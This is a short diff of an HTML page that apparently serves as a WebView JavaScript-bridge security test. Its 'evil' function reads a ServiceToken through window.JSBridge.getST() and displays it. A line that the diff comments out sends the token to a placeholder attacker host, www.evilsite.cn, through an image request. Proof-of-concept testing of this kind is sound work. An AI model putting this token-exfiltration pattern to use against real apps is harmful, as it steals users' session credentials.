@@ -7,7 +7,7 @@
     </head>
     
     <body>
-        <p id="content">ICSL</p>
+        <p id="content">StevenWebViewTest</p>
         <script>
 
         function gotowhite(){
@@ -16,8 +16,8 @@
         
         function evil(){
             var result = window.JSBridge.getST();
-            document.getElementById("content").innerText = "www.evilsite.cn成功调用getST获取到ServiceToken：\n"+result;
-            document.body.appendChild(document.createElement("img")).src = "https://www.evilsite.cn/abc?from_Huawei_Music="+result;
+            document.getElementById("content").innerText = "HiApp/Evil.html成功调用getST获取到ServiceToken：\n"+result;
+            //document.body.appendChild(document.createElement("img")).src = "https://www.evilsite.cn/abc?from_Huawei_Music="+result;
         }
         
         setInterval(gotowhite,5);//5毫秒
